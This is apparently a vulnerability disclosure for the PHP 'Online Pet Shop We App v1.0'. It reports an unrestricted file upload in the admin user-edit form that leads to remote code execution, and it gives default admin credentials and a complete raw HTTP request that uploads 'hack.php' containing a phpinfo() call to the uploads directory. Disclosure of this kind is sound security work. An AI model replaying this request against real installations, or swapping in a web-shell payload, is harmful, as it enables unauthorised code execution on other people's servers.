# Online Pet Shop We App v1.0 by oretnom23 has arbitrary code execution (RCE)

BUG_Author: z1pwn

Admind login account: admin/admin123

vendor: https://www.sourcecodester.com/php/14839/online-pet-shop-we-app-using-php-and-paypal-free-source-code.html

Vulnerability url: http://ip/pet_shop/admin/?page=user ---> http://ip/pet_shop/classes/Users.php?f=save

Loophole location：The editing function of the "user" module in the background management system there is an arbitrary file upload vulnerability in the picture upload point.

Request package for file upload：

```sql
POST /pet_shop/classes/Users.php?f=save HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/pet_shop/admin/?page=user
Content-Length: 748
Content-Type: multipart/form-data; boundary=---------------------------192831994119577
Cookie: PHPSESSID=k8u390ikl968phg971gmpmhtj5
Connection: close

-----------------------------192831994119577
Content-Disposition: form-data; name="id"

1
-----------------------------192831994119577
Content-Disposition: form-data; name="firstname"

Adminstrator
-----------------------------192831994119577
Content-Disposition: form-data; name="lastname"

Admin
-----------------------------192831994119577
Content-Disposition: form-data; name="username"

admin
-----------------------------192831994119577
Content-Disposition: form-data; name="password"

admin123
-----------------------------192831994119577
Content-Disposition: form-data; name="img"; filename="hack.php"
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
-----------------------------192831994119577--
```

The files will be uploaded to this directory \pet_shop\uploads
![image](https://user-images.githubusercontent.com/54017627/185293790-9267693f-3a2e-466f-aa92-d255baf7e6ce.png)

We visited the directory of the file in the browser and found that the code had been executed
![image](https://user-images.githubusercontent.com/54017627/185293897-fc3cfa05-d4a5-4d5e-b01c-f51274b489aa.png)
